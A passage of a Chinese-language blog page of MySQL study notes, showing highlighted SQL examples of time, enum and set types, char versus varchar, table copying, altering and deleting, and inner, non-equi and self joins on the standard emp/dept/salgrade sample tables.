二进制大对象(存储图片，视频等流媒体信息)</span><br><span class="line"><span class="type">CLOB</span>      字符大对象(存储较大的文本)</span><br></pre></td></tr></table></figure><p>测试：时间类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="type">time</span>(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    myYear <span class="keyword">year</span>,</span><br><span class="line">    myTime <span class="type">time</span>,</span><br><span class="line">    myDate <span class="type">date</span>,</span><br><span class="line">    myDataTime datetime</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> now();</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> now()               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">11</span>:<span class="number">46</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">current_time</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">current_time</span>() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span>:<span class="number">11</span>:<span class="number">52</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="type">time</span>(myYear,myTime,myDate,myDataTime) <span class="keyword">values</span>(now(),now(),now(),now());</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="type">time</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> myYear <span class="operator">|</span> myTime   <span class="operator">|</span> myDate     <span class="operator">|</span> myDataTime          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>   <span class="number">2021</span> <span class="operator">|</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>测试：enum  set</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_enum(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    aa enum(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">正确测试：</span><br><span class="line">只能在 以上中选择数据进行插入，别的数据不可进行插入</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;qqq&quot;);  #数字对应<span class="number">1</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;www&quot;);  #数字对应<span class="number">2</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;eee&quot;);  #数字对应<span class="number">3</span> </span><br><span class="line"></span><br><span class="line">错误测试：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;zzz&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;qqq,www&quot;);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;4&quot;);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_enum;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> aa   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> qqq  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> www  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> qwer <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_set(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    aa <span class="keyword">set</span>(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;qqq&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;www&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;3&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;qqq,www&quot;);</span><br></pre></td></tr></table></figure><p><strong>char 与 varchar 的选择</strong></p><blockquote><p><strong>解释</strong>：<br><strong>char(10)</strong>:可以存储长度为1<del>10的字符串，不论所要存储的字符串长度为几，均固定划分10个空间去存储。也就是说，即使存储的字符串长度为4，也仍然会有6个空间剩余。<br>**varchar(10)**：可以存储长度为1</del>10的字符串，区别在于，varchar可以根据存储的数据进行 <strong>动态分配空间</strong>，即如果存储的字符串长度为4，就只分配4个空间，没有剩余。</p></blockquote><blockquote><p><strong>使用</strong>：<br>当某个字段中的数据长度为定长时，采用char;   如果插入的数据大于本身定义的char大小，将会自动截断<br>当某个字段中的数据长度不确定时，采用varchar</p><p>char 查询速度 &gt; varchar</p></blockquote><p>建议：建表时表明最好以<code>t_或者tbl_</code>开始</p><p><strong>表的复制</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将查询结果当作表创建出来：</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 <span class="keyword">as</span> <span class="keyword">select</span>语句;</span><br><span class="line">将查询结果作为数据插入到表中：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">select</span>语句；</span><br></pre></td></tr></table></figure><p><strong>表的删除</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> 表名;#Oracle不支持</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名;         #通用</span><br></pre></td></tr></table></figure><p><strong>扩展：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">alter</span>添加一列：</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> <span class="type">time</span> <span class="keyword">add</span> <span class="keyword">column</span> address <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.03</span> sec)</span><br><span class="line">Records: <span class="number">1</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="type">time</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> myYear <span class="operator">|</span> myTime   <span class="operator">|</span> myDate     <span class="operator">|</span> myDataTime          <span class="operator">|</span> address <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>   <span class="number">2021</span> <span class="operator">|</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># <span class="keyword">alter</span> 删除一列：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="type">time</span> <span class="keyword">drop</span> <span class="keyword">column</span> address;</span><br><span class="line"></span><br><span class="line">#<span class="keyword">delete</span> 对表的操作</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="type">time</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;#删除一列</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="type">time</span>;#删除一整张表</span><br></pre></td></tr></table></figure><h1 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h1><h3 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">特点：条件是等量关系</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span>  #<span class="keyword">inner</span> 可省略</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line"><span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br></pre></td></tr></table></figure><h3 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">特点：条件是非等量关系</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span>  <span class="operator">/</span><span class="operator">/</span><span class="keyword">inner</span> 可省略</span><br><span class="line"></span><br><span class="line">on...between...and...</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure><p>示例：找出每位员工对应的工资以及相应的工资等级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="operator">&gt;=</span> c.losal <span class="keyword">and</span> a.sal <span class="operator">&lt;=</span> c.hisal;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span>  c.hisal;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="operator">&gt;=</span> c.losal <span class="keyword">and</span> a.sal <span class="operator">&lt;=</span> c.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">800.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">1100.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>  <span class="number">950.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">特点：一张表看作两张表，自己连接自己</span><br></pre></td></tr></table></figure><p>示例：找出每位员工对应的上级领导名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">员工编号，员工名，上级领导编号：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> empno,ename,mgr <span class="keyword">from</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> mgr  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span> SMITH  <span class="operator">|</span> <span class="number">7902</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7844</span> <span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7876</span> <span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">7788</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7900</span> <span class="operator">|</span> JAMES  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7934</span> <span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">7782</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">将该表看作两张表：</span><br><span class="line"></span><br><span class="line">员工表：emp a</span><br><span class="line"><span class="operator">|</span> (员工名)<span class="operator">|</span>(对应上级领导编号)<span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> mgr  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> <span class="number">7902</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">7788</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">7782</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"></span><br><span class="line">领导表：emp b</span><br><span class="line"><span class="operator">|</span>(领导编号)<span class="operator">|</span>(领导名)<span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">自连接查询：条件：员工表中员工的上级领导编号等于领导表中领导的领导编号</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename <span class="keyword">as</span> <span class="string">&#x27;员工名&#x27;</span>,b.ename <span class="keyword">as</span> <span class="string">&#x27;领导名&#x27;</span> <span class="keyword">from</span> emp a <span class="keyword">join</span> emp b <span class="keyword">on</span> a.mgr<span class="operator">=</span>b.empno;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span>   员工名   <span class="operator">|</span>   领导名   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> SMITH     <span class="operator">|</span> FORD      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN     <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD      <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN    <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT     <span class="operator">|</span> JONES     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER    <span 